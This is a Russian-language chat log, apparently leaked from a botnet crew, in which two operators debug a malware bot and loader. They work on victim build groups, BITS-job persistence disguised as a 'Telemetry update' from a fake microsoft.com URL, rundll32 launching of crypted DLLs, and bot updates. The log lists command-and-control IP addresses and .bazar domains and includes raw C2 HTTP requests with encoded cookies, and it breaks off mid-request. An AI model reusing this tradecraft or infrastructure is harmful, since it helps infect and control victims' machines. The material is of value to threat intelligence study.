[04.08.21 12:16:45] royal:		Этот косяк почему то только в 19 гуппе.
[04.08.21 12:18:26] royal:		Запрещённые символы
[04.08.21 12:18:29] royal:		В имени файла.
[04.08.21 12:19:01] royal:		Разве может быть доллар в имени файла?
[04.08.21 12:20:59] royal:		$mynewname01 в PowerShell это переменная считается
[04.08.21 12:21:10] royal:		Заменится на её значение.
[04.08.21 12:21:48] royal:		Так запустится, в этом я уверен.
[04.08.21 12:22:22] royal:		У меня подозрение на документ.
[04.08.21 12:22:34] royal:		Что он химичит что то.
[04.08.21 12:23:00] royal:		Ты в cmd запускай
[04.08.21 12:23:09] royal:		Или Win+R
[04.08.21 12:23:39] royal:		Лучше Win+R это точнее будет.
[04.08.21 12:24:04] royal:		Никакой отсебятини не будет от cmd или powershell
[04.08.21 12:26:01] royal:		Документ даст сейчас, тогда всё бвстанит на свои места.
[04.08.21 12:27:00] royal:		Это не влияет.
[04.08.21 12:28:00] royal:		В логе видишь c:\users\public\{$mynewname02}.jpg
[04.08.21 12:28:09] royal:		Там всё корректируется.
[04.08.21 12:28:21] royal:		AM Adding https://microsoft.com/telemetry/update.exe -> C:\Users\tstuser1\AppData\Local\Temp\C23F.tmp bits job with cmdline c:\users\public\{$mynewname02}.jpg
[04.08.21 12:29:41] royal:		Группу 20 и g15 так же делать? Получать имя в DllMain?
[04.08.21 15:03:37] collin:		Last_report_send_error_12003:
[04.08.21 15:03:47] collin:		в команде rundll 300 marcopolo.dll DllRegisterServer
[04.08.21 15:03:52] collin:		12003 что значит?
[04.08.21 15:05:20] royal:		Ошибка wininet при отпавке ответа о выполнении команды.
[04.08.21 15:09:21] royal:		Запрос прокатил, но код не 200 скорей всего.
[04.08.21 15:19:38] royal:		Я думаю со связью что то.
[04.08.21 15:19:51] royal:		у некоторых команд ok вообще
[04.08.21 15:20:16] royal:		а это происходит когда не удалось даже отправить информацию об ошибке
[04.08.21 15:20:30] royal:		и эта информация отбросилась
[04.08.21 15:20:40] collin:		да что-то с адресами, штормит их сегодня 12003 и 12002 через раз
[04.08.21 15:58:58] royal:		Все боты умерли?
[04.08.21 15:59:11] collin:		увы
[04.08.21 15:59:29] collin:		адреса легли все
[04.08.21 15:59:33] collin:		видимо главная прокладка
[05.08.21 07:22:13] collin:		привет!
[05.08.21 07:22:48] collin:		смотрю боты вчерашнего прогруза группа 19 - path у всех почти
[05.08.21 07:22:54] collin:		удалось найти 1 бот из 30 с пустым
[05.08.21 07:23:09] collin:		7eac247f984cadeab3817b91f9b3322b
[05.08.21 07:23:24] collin:		ну это все равно хорошо по сравнению с тем что было
[05.08.21 07:24:09] collin:		когда path есть - ручной закреп, автозакреп, обновление по команде будут работать корректно, правильно?
[05.08.21 07:45:20] royal:		Да.
[05.08.21 07:47:45] collin:		насчет парсинга командной строки - добавь в отчет GetSysInfo еще один параметр LdrCmdLine в который выводи командную строку первичного запуска лоадера
[05.08.21 07:47:52] collin:		из лоадера в бот соответственно передавай это значение
[05.08.21 07:49:05] collin:		это не для всех сборок - отдельный режим, который включим на группах 19 20 разово, потом соберем инфу и посмотришь - каждая ли строка корректно парсится
[05.08.21 07:50:51] collin:		один момент - при первичном запуске (не из закрепа) нужно чтобы бота запускал экземпляр лоадера который первым стартанул, а не тот что из закрепа запустится - такое всегда выполняется или есть исключения?
[05.08.21 07:52:57] royal:		Есть такое. Только один экземпляр может работать бота и загрузчика. Кто первый запустился тот и работает.
[05.08.21 07:56:54] collin:		сделай сборки группы 19 20
[05.08.21 07:57:03] collin:		с теми же параметрами как вчера, но только без автозакрепления
[05.08.21 07:57:08] collin:		адреса и базары:
[05.08.21 07:57:20] collin:		```
адреса первого этапа
бот:
134.122.91.133
161.35.223.189
164.90.164.50
167.172.46.184

лоадер:
164.90.164.50
167.172.46.184
134.122.91.133
161.35.223.189

домены второго этапа
бот:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar

лоадер:
whitestorm9p.bazar
bluecloud21c.bazar
yellowdownpour81.bazar
```
[05.08.21 07:59:41] collin:		направь сборки wild и мне продублируй группу 19
[05.08.21 08:04:22] collin:		добавил таск "Параметр LdrCmdLine в отчете по команде GetSysInfo"
[05.08.21 08:05:30] collin:		LdrCmdLine - как успеешь, сегодня не обязательно
[05.08.21 09:23:51] collin:		`ну вот надо бы проверить что произойдет при обновлении крипта со старым ключом на крипт с новым ключом` возможны тут какие подводные камни?
[05.08.21 09:24:31] royal:		Ничего. Загрузчик скачает свой бот новый.
[05.08.21 09:24:39] royal:		И запустит.
[05.08.21 09:25:23] royal:		Сотрёт файл старого.
[05.08.21 09:26:29] royal:		Обновишь на старый, тоже самое будет.
[05.08.21 09:26:39] royal:		Нету понятия старый или новый.
[05.08.21 09:26:57] royal:		Просто один удалиться, а другой скачается и запуститься.
[05.08.21 09:27:13] collin:		я так и подумал с сегодняшней сборки обновить на вчерашнюю в тесте
[05.08.21 09:37:15] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAAmTIxIy8ci4ZJl6xIaBeTYRbdhBViOxR13oqZq0WEYBCm
1EuCYjVL1ZXgSn/5OAB+tRdqYxbpxUkYEsYQQFO0Qe9Oo6NMhtOcjlXfpiDXeTo5
gwUmN914DKIECVruzZovmYBlUBdjpCH1m7LYUBp0Zl62IwHP6yCWiyhulJcWgpwu
AUM5HH899edlYqYdRPUdN3No58UPp63Teon9cIMk9X7dke7AfE5740bOCKhCAM6P
jrSMRw5VHj/OnR3zWDV0yVW+2IjVpCf2uYi9kY392V7uVNSQDUc7voPQqI+36RRP
rnp+5GbZF95GSGWDF3BWHMtzKqQPvWpkqw9Dz+drAVOHwSRmCqpKNYtajiTOywyt
Rd1zA1oolHQClcrF42ZNiPXMlPjCbrbILMN6B9vVIDqi7Qif2gyFtk7bArIwlxJw
eTafhVbQe3vNPYspxZ/JBjrjI6gUu0j3VpqH08mFej42zj/X8o5xMbC45pZqyE5/
xnH38gKe3S4daMufrG+yQRr4r7jejUGVqHayXmz1roS728E1r76V0jEaR1dfK7rO
Pvb2AyIF/3ZXDG628uMmQABw5guWSipo7Ye1fRdFMXgdIPzqAlTR/aeocsHxKxw3
fCBv82FPoU8yenlHi5aI+eCQxViLaTrbGP5gsP0iV7ffNuD5NhndNj5TevkHeULS
wD0BpRqiI1V5YSjdg4z/+VHHEpwwxiKMCedczzVIP75ihpbaF5bXOOAAoP2wunvJ
9B5XNPpYwy2qKm/k+Zc++nGyWA89b+KOB8iGM21F1AApdBp6gKATsPOXei0bwDsN
6RYNS+f4mdyA6PvJCFC+YZ+txDZEv7/XqOcdj0wNDoljP4Kue8njcLI18BP2D5oS
kyTv/hxZIIryW4eL0F/B5ghJG+khMgpWpzkd+xuGxmPXZ3yzUqukQgV/QP9zSmiB
qDvd1bk5bQXfymGclli8z5tMyyLP0nhgU/kRtDloAXt64199Xiq9V5d/6iCfnKG+
bGJVm0IX4FeaCbNCrLjM
=ysST
-----END PGP MESSAGE-----
[05.08.21 09:38:39] collin:		gcc брать?
[05.08.21 09:45:06] royal:		Да.
[05.08.21 10:26:13] collin:		сделай запросы в сыром виде для бота и лоадера, на новой основной админке: 
1) запрос бота с командой /2 
2) основной запрос лоадера
и скинь мне их
с ответами
то есть через postman, curl или подобный софт
[05.08.21 10:36:03] collin:		`NOTIFICATION COMMAND LINE: 'C:\Temp\energy2.dll' 'C:\Temp\energy2.dll 2292071692'`
[05.08.21 10:36:27] collin:		не та команда на закреп - rundll32/regsvr32 должно же быть
[05.08.21 10:40:43] royal:		Это вывод такой.
[05.08.21 10:41:43] collin:		это из команды bitsadmin
[05.08.21 10:41:49] collin:		сейчас полный скину
[05.08.21 10:42:27] collin:		```
GUID: {D9F43886-5588-4F2B-ACCA-0B3159374B92} DISPLAY: 'Telemetry update'
TYPE: DOWNLOAD STATE: ERROR OWNER: DESKTOP-U970893\tstuser1
PRIORITY: NORMAL FILES: 0 / 1 BYTES: 0 / UNKNOWN
CREATION TIME: 8/5/2021 3:34:58 AM MODIFICATION TIME: 8/5/2021 3:35:00 AM
COMPLETION TIME: UNKNOWN ACL FLAGS:
NOTIFY INTERFACE: UNREGISTERED NOTIFICATION FLAGS: 2
RETRY DELAY: 10800 NO PROGRESS TIMEOUT: 0 ERROR COUNT: 1
PROXY USAGE: PRECONFIG PROXY LIST: NULL PROXY BYPASS LIST: NULL
ERROR FILE:    https://microsoft.com/telemetry/update.exe -> C:\Users\tstuser1\AppData\Local\Temp\EFB.tmp
ERROR CODE:    0x80190194 - HTTP status 404: The requested URL does not exist on the server.
ERROR CONTEXT: 0x00000005 - The error occurred while the remote file was being processed.
DESCRIPTION:
JOB FILES:
        0 / UNKNOWN WORKING https://microsoft.com/telemetry/update.exe -> C:\Users\tstuser1\AppData\Local\Temp\EFB.tmp
NOTIFICATION COMMAND LINE: 'C:\Temp\energy2.dll' 'C:\Temp\energy2.dll 2292071692'
owner MIC integrity level: MEDIUM
owner elevated ?           false

Peercaching flags
         Enable download from peers      :false
         Enable serving to peers         :false

CUSTOM HEADERS: NULL
```
[05.08.21 10:42:55] royal:		А это после anchor
[05.08.21 10:43:01] royal:		Я там забыл изменить.
[05.08.21 10:43:05] collin:		да после анчора в сегодняшней сборке
[05.08.21 10:43:32] collin:		поправишь?
[05.08.21 10:43:39] collin:		только бот менять или в лоадере тоже?
[05.08.21 10:44:26] royal:		Бот заменю сейчас.
[05.08.21 10:46:27] collin:		updatenow update - отчет по команде:
[05.08.21 10:46:30] collin:		```
pid:	0

msg:	193
```
[05.08.21 10:46:44] collin:		```
ERROR_BAD_EXE_FORMAT
    193 (0xC1)
```
[05.08.21 10:47:05] collin:		после апдейта как запускается модуль - проверь тоже
[05.08.21 10:49:16] royal:		19 заменил.
[05.08.21 10:49:49] royal:		Какой файл ты туда грузил?
[05.08.21 10:50:51] collin:		dll крипт вчерашней сборки
[05.08.21 10:51:04] royal:		Как мне его найти?
[05.08.21 10:51:10] royal:		Он вс писке есть?
[05.08.21 10:52:44] collin:		```
4l}<Y:u{b,~5]l"g
https://privatlab.com/s/v/AEErWMQGAwS2D9JQ8gNB
```
[05.08.21 10:52:58] collin:		вот этот грузил в force update now
[05.08.21 10:53:41] royal:		Ещё раз. Всё стёрлось.
[05.08.21 10:55:13] royal:		Я скачаю из админки прямо.
[05.08.21 10:55:40] collin:		там нигде не сохранился вроде
[05.08.21 10:55:45] royal:		Там зашифрованный будет.
[05.08.21 10:55:58] royal:		Она же шифрует его?
[05.08.21 10:56:21] collin:		вижу в списке файлов группы dl2_x64_19_341_27784_1.dll - вот этот вот
[05.08.21 10:56:32] collin:		при скачивании с админки - будет исходный
[05.08.21 10:56:50] collin:		когда бот скачивает по 10 4 - там зашифрованный в соответствии с прото2
[05.08.21 10:56:55] royal:		У меня нету в списке.
[05.08.21 10:57:01] royal:		Давай ссылку.
[05.08.21 10:57:13] collin:		вот выше кинул
[05.08.21 10:57:22] royal:		Стёрлось всё.
[05.08.21 10:57:30] collin:		```
4l}<Y:u{b,~5]l"g
https://privatlab.com/s/v/AEErWMQGAwS2D9JQ8gNB
```
[05.08.21 10:57:53] royal:		Он должен rundll32 запуститься так?
[05.08.21 10:58:48] collin:		"rundll32 file.dll,DllRegisterServer" - вот так должен, либо через regsvr32
[05.08.21 10:59:06] royal:		А я запускаю StartW
[05.08.21 10:59:21] collin:		в крипте есть StartW этом
[05.08.21 10:59:25] royal:		Вот по этому нужен дополнительный параметр в команду 10 4
[05.08.21 10:59:30] collin:		если была в исходнике - при криптовании пробросилась
[05.08.21 11:00:16] collin:		параметр добавим, составляю ТЗ для альфонса
[05.08.21 11:00:24] collin:		но пока нет его
[05.08.21 11:19:16] royal:		Заменил 19.
[05.08.21 11:32:39] royal:		Что то крипт не работает этот.
[05.08.21 11:33:00] royal:		rundll32.exe file.dll,StartW
[05.08.21 11:33:14] royal:		Нету бота в админке после этого.
[05.08.21 11:33:46] collin:		гляну
[05.08.21 11:34:03] collin:		но мы не тестили со StartW его
[05.08.21 11:34:18] collin:		ты сделал запуск через StartW?
[05.08.21 11:34:29] royal:		Он должен работать со StartW
[05.08.21 11:34:39] royal:		Из закрепа всегда rundll32 StartW
[05.08.21 11:36:06] royal:		У него в экспорте есть StartW
[05.08.21 11:36:13] royal:		Может адреса накрылись.
[05.08.21 11:36:24] collin:		с утра работали
[05.08.21 11:36:51] royal:		Запусти его через rindll32 StartW
[05.08.21 11:39:00] collin:		updatenow update dl2_x64_19_341_27784_1.dll  - смотри у меня такой отчет:
[05.08.21 11:39:03] collin:		```
pid:	7552 background

msg:	

```
[05.08.21 11:39:19] collin:		файл не поменялся, тот же крипт что был
[05.08.21 11:39:23] collin:		бот не завершился
[05.08.21 11:40:22] collin:		попробую логированным ботом
[05.08.21 11:41:58] collin:		вижу что новый лоадер он скачал в %Temp% а не вместо старого файла
[05.08.21 11:42:01] collin:		так и задумано?
[05.08.21 11:42:20] royal:		Старый удалиться.
[05.08.21 11:42:35] collin:		когда?
[05.08.21 11:42:42] royal:		Если имя файла бот знает
[05.08.21 11:42:52] royal:		Перед завершением бота
[05.08.21 11:43:10] collin:		BITS задача не удалилась на старый файл
[05.08.21 11:43:12] collin:		и файл остался старый
[05.08.21 11:43:39] royal:		Значит не знает имя.
[05.08.21 11:43:42] collin:		бот должен скачать запустить новый файл лоадера, затем сразу завершится - так ведь у тебя?
[05.08.21 11:43:55] collin:		насчет имени, сейчас проверю еще раз
[05.08.21 11:44:20] royal:		Чтобы он имя знал надо через загручик запускать.
[05.08.21 11:45:56] collin:		блин не туда смотрю, файл он удалил
[05.08.21 11:46:13] collin:		значит он его знает - почему тогда новый в другое место дропнул?
[05.08.21 11:46:13] royal:		Сам крипт не работает.
[05.08.21 11:46:28] royal:		Он всё в temp скачивает.
[05.08.21 11:47:03] collin:		а не все отработало, с 344 на 341 перешел
[05.08.21 11:47:19] collin:		сейычас еще раз прогоню, отвлекся и перепутал все
[05.08.21 12:12:31] collin:		все работает как надо
[05.08.21 12:17:07] royal:		Тогда заменяю так же 20 группы бот.
[05.08.21 12:17:22] collin:		ок
[05.08.21 12:46:47] collin:		про сырые запросы писал  - осталось или чат затер?
[05.08.21 12:47:04] royal:		20 заменил бот.
[05.08.21 12:47:17] royal:		Про какие сырые запросы?
[05.08.21 12:47:46] collin:		сделай запросы в сыром виде для бота и лоадера, на новой основной админке: 
1) запрос бота с командой /2
2) основной запрос лоадера
и скинь мне их
с ответами
то есть через postman, curl или подобный софт
[05.08.21 12:48:12] royal:		А что значит сырые?
[05.08.21 12:48:40] collin:		в таком примерно виде
[05.08.21 12:48:43] collin:		```
GET /australia8/vcn5basg3/new HTTP/1.1
Cookie: Anfl3dVEHP9seMngINAFJN=svX1UctItkjRV6QgzACI%2Blo3seWXvRbNVHps1p0WmFFU55rnDhyBsZQEEyi%2FwHdI4tnVQcMYf8OupPW5q%2FLzjSBYDef%2BvVZZwyngE0tjhj3eST56G9hsDBQZ7jaN7uzbJRwlsME%2BzMXHzyAW2HbgF5k66TfFxJBn7TuplOmGrLYTBN%2BcZ%2F3U%2BMCuSwQpK1QRHTwrvN8HydvSQ%2B5%2FZ7%2FWCwriNj8gOPgiPLyo6uZBBHfGCkV3ltqrJ23ryoBZmwOF%2BPVa7%2FxZbbrlueF5ubnFI0p74KcEhAuFJf%2FhqsIY3I4dnNxDxZ5bcBvnHJC5uYIOC0E4JNufN%2Bp7qi6wORwaNQ%3D%3D;SdLw4znKBB9seMngINAFJN=SdLw4znKBBucg8dfGJWfzuKQz5ie7jjtHFF3jfJBElKDZgdKHzeqcWy1;WkNNwQfT5CXjJ37gINAFJN=WkNNwQfT5CXjJ37DcAj6gP9KKrJR0s8aqkNNwQfT5CXjJ37DcAj6cWy1;Wvcik9xcTjj4OiDHlv8HJN=WvciwQfT5CXjJ37DcAj6gP9KKrJR0s8aqkNNwQfT5CXjJ37DcAj6cWy1;S6gEAedRJatD3nbGxqPmM8UC=S6gEAedRJatD3nbGxqPmM8UCCjvn9s8aqkNNwQfT5CXjJ37DcAj6cWy1;SQ2VDfThqacH6Tl4xqPmM8UC=SQ2VDfThJatD3nbGxqPmM8UCCjvn9s8aqkNNwQfT5CXjJ37DcAj6cWy1
User-Agent: PostmanRuntime/7.28.2
Accept: */*
Cache-Control: no-cache
Postman-Token: decb2132-cdc2-4bbb-8091-40704ac7cf83
Host: 161.35.223.189
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
 
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 2
Connection: keep-alive
Date: Thu, 05 Aug 2021 09:42:39 GMT
Set-Cookie: test3=bkGHUA78V4JIFxsgPqxEmw3dNLQWc1xGqgC2dGbhJm7HRwS9bh9nN3QMnsSTyeUUMSML5Jpl93HA7Niv5CvwFVzaimC07E2H4BbLonXVRsPWMtwAfOpIbCklYGHRbVa1sKSnz8PjRsyFN7AvwRNrNeTylxPwkQ8MgScZUR24rTZqzis9y4mV2zBmTrHJzqUdTknpB2Tm14XLI0Xnn6mT10tJWu21qsGyUfjPhyoUMtSacPZ2wfeqH9XqrByAlcpG
Set-Cookie: test1=ohdqTeXWdCI%2F48k1zvOCL67mlk43vjUdFHj7eDOLVIoijfxDCuzKTvk43I0TT%2Fa0VUNAz%2FD1Q8NDmbFgB9%2B5FgULXOFitwLa5NbRrOPR2Y6jq3%2FKuvot7aDkCOFQ9HiAvtt69bQfF1tmjcOiFEYKMjz%2F8m6XyLMm%2B5GdhwCF3D8h92kg2VcCQtP1a6DWFZIZSuZwqT86UQ7or%2BcssqsibwXI%2F4F2C4Oy%2BaKZjOVuf05wXNdSp7%2F9MDApyjKUrjQSlcUMfmzJSBLnvccy8XD1rsMLgCAgaiSyg2it8fTB9ERRLQwgqhsQ4Y3Uks8fZ8G%2BfQJQpQVV9au0rJNx%2BDuD4g%3D%3D
Set-Cookie: test4=D1jqUxBzolqozQlWuZBrbWoDWqckfp1weU45Gh2d3pTCBU3OPv0Ld7nV2q9lywIrbZzDZx83Vr5nQ1E8k1353RNWcT4qCjwtUtRi5sgzDGxRr7DtaixJDRM1XspxWcS1rnJVoJklEGRSgO9ewfJjD37DPIP7Ro1xJcsngTHFhGdIU0nzZxUqr76yyh0tzZlIVLhplM2BkLdxrN5HCpSVPehXRA3dQTfKPYU2wnGo09eN2afE2kBqHvKJ7sA5OZob
Set-Cookie: test5=6Y7YxYq3W3vFCoya9c2Bmz8e8oGPraizrcY4
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
 
OK

```
[05.08.21 12:49:13] royal:		Сейчас.
[05.08.21 12:57:09] collin:		`path:	C:\Users\timmy\AppData\Local\Temp\gyr6_vc=4eyoNNPxt2YQPjsp3` в одном из новых ботов
[05.08.21 12:57:24] collin:		без расширения и с = - распарсился бы?
[05.08.21 12:58:00] royal:		По идеи да.
[05.08.21 12:58:42] royal:		Запрос команды:
> GET /handler/text/rich HTTP/1.1
> Host: 134.122.91.133
> User-Agent: insomnia/2021.4.1
> Cookie: HSID=PCHyd%2FxOKuAhwO%2BYiU9ozHxUWGap%2B3Qs5mBZMWybPIUYoBpyp8RYEsN3gBLfH8qxt3s%2FJqEowmEZgPgtqhcmvO3rEg41RLomrMyipAQKeaqeh14bsIs7p2X5D7DqTQKCR2%2F4YSCRqwSIWnaTxRL8sfeb3KUiFEoEclgHb%2BtTHmYLmOJWfe%2FoOEmV9SdJcP1qiyjyqB8jpcmmwI9SPufmOiH9PpGzhkVLxDfmqXn6cl0v97nMZUYttA2nboabFNcqJBVDop3xQWJxZ%2F7qzn1rEkxpcWl%2F%2FNqz6CPK3lTBpYeLQn85w6fQKJKFh3y4UbaT6hhN4aZGD1j2yJ3aDMUbAg%3D%3D;SIDCC=h3M4IdYK4qZ0E17d6hg7D7v2T5WxQNhT8y%2FOD6eVcpWRGuZUo1rUT2HGiR74Baz7tAne%2BmJFEEe6yWmynwbMZ0vWZ5ARxAjwFMmM%2Bhr41rD7mhY54Q2%2FdOBq%2BGlQy1tO%2BSj8DhsgNBDDf1yx7lLGywd2uyxZ0ONXvFGyxZXCGMKmP%2Bx6Juc6fH0VG1UilZaukbWilfOlF91tFpp0gbiYj%2BLaujD1%2FYkGr2luOjh4rKU5My5EnnViqcZrN3rN93e6gPAgTqvKy%2BcyicQFyqT9ShJZn%2B13%2FbKarySLK%2Bk4mKkvxJXV%2Fk0c2DhjsW5ddSwoyy5YGltgUurlwZDEGoazdg%3D%3D;SID=XUoEBG3w4FXM82gizqVMVjM4GPxAe3wrDMii6zvevvHSUTqRs3Tz7vExd2Pd6bmcIE%2BDTsWKYL7PWVdKcCOtcYzHov0cpUkA%2BmxUgTi0VNkl6zvW5kbIF424R%2BQaabmeyucg%2FVbWysdYOIint8c8k05mkDDf8r%2FHeQap%2BEUWdfwmoivs6zOyoZ92agHZzB%2Bn5mMnBg1Zk07DJrjFx4yZgjHrpWWmu1%2FGjaN%2FQm4mrDetrJLWmJe946nV%2FZVHkI1Ibzxehku3ILrdc6cO69WyV63xJFjpMjLwfaoYexlrrv9aUut9kGBrCOULJ%2F2YTEIQIds7fB%2Bg6r%2FIDLbH5HFc7w%3D%3D;SSID=i34Wwr7T2pBpapR3kF1CXtVZ0hTK0lC503uuxJ34kJnS34Ycd6rJi1ijc0tnuVZeQ3H18Rgi7Qfs1oDQNVQAtjrJYAnWfNP%2BJ9qs23Q84fJxqzXGt1GlECDSYFRUpREmgx0%2F5YNZ8R6bVOL3NL1DxmtGbMsLSs%2B65lG%2FJ2e2ZEkzUd%2BGZHjTgbuvd6eOHBpba1VnW5UDpcnuvMGW%2BNz%2B00ts%2Fjs%2B4Ks7S7CsZaUp7KQ2wfjF2UAQx1eteB6OKbFnG0j2gFdL5ba1%2Ba3QtyGOemTOyhzaWgZmRfG2u8CVTXbvrpYjAQHEgXiSzoDjdlKruh5YF8xc0QPoPMr1yDr4tw%3D%3D;
> X-Tag: oeyMZEfSIul588NDWnTq0ZV9Sc3Fv2JWT44u3ZcIO8pB7rmxUAvs2%2FJ2tvI3DrglVlxutxtDmrZnFP4Eg%2FvU%2FaZg9H4f3Q0crxB29dDIXXy9qaPBfYoR8%2BKvXbXwylgET4a3xWC3X8TeFBMy2JlYeErq1bjaPQD0O7ZqQUsAz3HD0KXeEsX%2FtD3A5DPqMNEW7NrHBn63x79O1uv5J6UUZFFxi%2FusEzvXGsOkCEzkO6yM6b2c4B65%2FgbHLqgbmJsCqmgcnf%2BJ%2F%2B2stmI8JnmkP%2F5YPeulDMbhc7lJB960x3cwB8qLizZlcqq2EcRvMAT7wJ5ycnWWPTkL6RIUoF0yyA%3D%3D
> X-Csrf-Token: JZFpEozRUc5vwsDYxTkS8hU0%2BUBJDiaMaTv6yTTLMywEytzA4MJbwn%2BQ2SWtDBmTP3QhS5GL0x%2FWGJp%2FcIfUYSrvKJtYLU2Wz3NJCBPp5l4Sqa07dSbEkTJUS6uyI0CkveFg%2BWFLAZKLwR4NkUinP5SQ5%2Fpq2XFCqmvx7ARLJNEP%2BAz65%2FQfQBdbNkVJpkA0PtiMpgn2mEMYZyQoY3y7bm8SMjw2eRxO80i5IChZf9vzCmvqasfrPX1txw6jOAKOCPzbdCVDWibZ13IJcq3bYd%2FSRPhW5tmSfFg6r9LX6nuHu2QWqO3hsKk5NOl3I8%2BtarrEGnwSkiG63IXWh9WavQ%3D%3D
> X-Request-ID: 1kzzRZmabyCoaVD%2FskOK7CYC%2B0nNhnerK5mbaaFSQF7EDK%2FqT%2F4sGoDEJg%2BV8T8RtouoLCFsTI2Kvh3Wr%2B%2FvkbeyP%2FIdlE9CtjsLXod34G2NCev5%2BeCVxXCVOXq0Lm%2FZQvaNKeVgdczO18b76RwhUnT6%2FkgupVdWOZe6r4CjGOWujBc0%2FJGr6GMShNKv2wNeOkMa0FKkIGPBmRw%2B5vJFUVUTBHGXJr8ttZq49qvbM69jc6ydXwmuqSzTCvPIW2UrH0f8egojq7Ck1x7CEDIKyNBItRfcUa4A3IEsHfb6zzkmzx2RGh2grRvvdDZOGT025hUz1kNDnosCKelwSW97Kw%3D%3D
> Accept: */*

* Mark bundle as not supporting multiuse

< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Content-Type: text/html; charset=UTF-8
< Content-Length: 2
< Connection: keep-alive
< Date: Thu, 05 Aug 2021 12:56:56 GMT
< Set-Cookie: NETID=YvNQVNaivgQva3ov
< Set-Cookie: resetflag=Wfr%2FdL5TMtzlhqyztlRJSyjZD0cu8KCBhDflioNRvxaKS0JIfHkrqiH2YQsqxadVTRiytc1fqYp6qYGholz5QKUsItxDe5bQi5Xl%2F2h%2FbhGKx452ympRkq%2BOHkz6EpX8AHM%2BbW5t29UuWImIosY0yqr%2F05FXuSghW6XQDJ0BYjnB1gz3lhD3MMunXRcQpH27UstUqvLconzL8kuESAJELedaZjxk8EuM4rvQPssHYXTOzTVrpo3gNqfgsQAcNW0Bqc5O45NVz7B94%2FP1j2fGroUhxfciLX9y1iuBroU7Lfiw9qzLcotSj2JmucAGX%2FTt7t4Dq%2FQKsz0grpvpP0P2nw%3D%3D
< Set-Cookie: CVAR=WpACb3LcipeJ8vUSqIqiFIxWYXaIWB0NHgJKzn1INo0Fc4wTIp5Cwemq67zAZTIqlEk8h4HYuGS5CZ6VYLYHNBWj6q5SgH3FmfMlrzr0g5RrZUnCKFqTR2XGG1bjyRf9WUKCIt6hx9Hpa1AWRIaXnrcxccvsApyltbSTSFjSPi4WP3dg0Xcd7xseBquvpexnfmngAiUqN4B3ovZxspUvY0zPVYIqbKVkJJPLRpu6vnfoQK6hvFrEw4NyeVZs9rbh
< Set-Cookie: VAR1=uwDInRE3fitssO0BnTrllU1gGro9izXhrDr522OX04SCnd3IBYShBlr4lnI9OwRkQOsVE5m1mU0ts2JyS7H4LP9idIsyOftvoXzHZb2a0gf7aOn9cjW7WCjBeG3hRF1k8Uft9K0K5ZXmKRjiV5KhN62vSuRGzlJsWuZBb0qZZI0WfUQNOGYvvP1ErtwdaQpZyJSbVLuz3GCHQ6QesIVPXSNJVYA849dLd56NjXOs7SXLvTEnghHHc32W3sSidnoX
< Set-Cookie: rec_number=true
< Set-Cookie: MAIN_VALUE=0nAVNkyKF11GaSuTveKVMC7rkftLO9N7vkV8Q11fLqRJ8ezYBTqLHM
< X-Frame-Options: DENY
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 1; mode=block
[05.08.21 13:00:01] collin:		это бот /2
[05.08.21 13:00:01] collin:		?
[05.08.21 13:01:03] royal:		Да
[05.08.21 13:01:16] collin:		сохранил
[05.08.21 13:03:15] royal:		Запрос бота загрузчиком:
> GET /handler/text/rich HTTP/1.1
> Host: 164.90.164.50
> User-Agent: insomnia/2021.4.1
> Date: Thursday, 05 August 2021
> Cookie: ANID=NneUHhX8E6o0qKp9BzlBll52tZYskqYOX0%2Fag%2FYwNXxqE2znbcW36bwnRjwF98LovjKICLLEd%2FzyimIBDmb1podgtIs5UniJjzycehD0B4BJ%2F0Us3eOBQJ%2F85JBIuBd6OzMItfQEEDCJHLsRsKTwqOEzGPqsGXXZDcJBSCyNeGkMrQoT7iaHl%2F3D8Hdpvfe%2BCtvTDDnIuIecmfQ38yXt2KBBu3carLtzpcewqnwHryjQKQZwMFur7rpQCSw%2Fpx67KJ9RgRf%2BUNBqRLdoVjgsZBcudjPMswHWwS5XTSJX7F3XkVQIRQjphzenVqSHmHUL%2BBjkr63nB5uvtQCok23PBA%3D%3D;CGIC=PEheDY2dd8wrZFahYZmkB63%2Bd3xdLL8e0E5eTeBdO8a50cQFhNgZhZcJSeGO2k3UsYjSsJXRf9bCsUcoC7KgdFfA3ozCjfcsja2k%2FuFHWH2Vcs1r%2BJeBvLUEgFEYKKedcEaPPvJLBk7EGFLOFjnUyuwNoOZLccgNfl8Uad4NRLpFqSCoIFNUK%2BbtH7QLaHLJrqBKxXFH0pRx4aZ%2BgU0ks%2FXBHe3XJQOKQ%2F7OG5tiRBsc0qUr36cAxQB%2FFAWFBq8mZhety1OB0Vh40SCAf9WEiH4Hhk1HlG7aHe4kPaNHDCpMc7R9YHywxSJFR1%2BbgdKRvdrrAHsZ5qeQvxqqBrKw3%2FDcVe6YHxwXFJUwAWAjnCTvTTSOBGm5YYamjxzlE5EuIyu5LFaHLCCDUg0C6a0cQ%2FOfh8GSKO%2BRhvJ%2FDsnOG1KqE%2Bt0dS2THb9qO4lZ78r7jOSTMuda3BDJiGyKkCu1bw9KbX%2FPWR7gEIPWdUddRLM%3D;DV=Gtlztj2MfLG7zgDFx1FQmJeDCkrr%2BGMaCV3BzsOqREBgJMmsbb%2BJogAKz%2BkQUBuWCWVCP8POFYfOtSTLR9FfE6H9ljrvXKJLcoBNLJgDbUrbv9mrE7Hrvuk82AhsQ89s0KLBgrGx%2FWs%2FwGaNlTF0Opb4LCVm0pVLW%2Fh1gP94T7WdqkJ0qtG7IvvsTM4JbCHPnlklasa36sr%2BXi7m3qmv0AkNPPK8uUEpoBVWmmB8rmWUMt4WzVNECi9mCZBfeagEtWpN6C4iWMP6s%2F0NW34Dj8ORtBSuJ6y3O1m4uj3xQZA%2FmD1fOPzaUARJMU%2B5nOrN8RS0IIfHDE2%2Bt2klHb9k%2FC5K9fBcaew%2FIckapea%2BMnbMxMthWO%2FoxXxp3k%2FeZ8I6EY6OXYJwTbhJx6nZfF6XERaBPFt49snxdJUxFoqXitS3p4bthilifQc4PS%2FPW%2B7evrg9YMVkr%2FwfS%2Buo3V1CRmYcQVxwDgb3jDTWCsYA4lo%3D;HSID=qrQJOACntvk7%2FU7sPImCp390M%2Fr%2BvoB9qPilrlIwa8sw7WIcaO7SPEy58ZlYtGaKshvxqMMdqh